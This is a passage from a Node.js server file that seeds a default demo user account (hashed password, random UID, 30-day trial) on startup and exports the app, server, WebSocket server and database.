      email: 'demo@xenora.com',
      password: hashedPassword,
      displayName: 'Demo User',
      role: 'USER',
      uid: `XENORA-UID-${crypto.randomBytes(10).toString('hex').toUpperCase()}`,
      daysLeft: 30,
      isVerified: true,
    });
    logger.info('Default demo user created');
  }
}

// Seed database on startup
seedDatabase();

module.exports = { app, server, wss, db };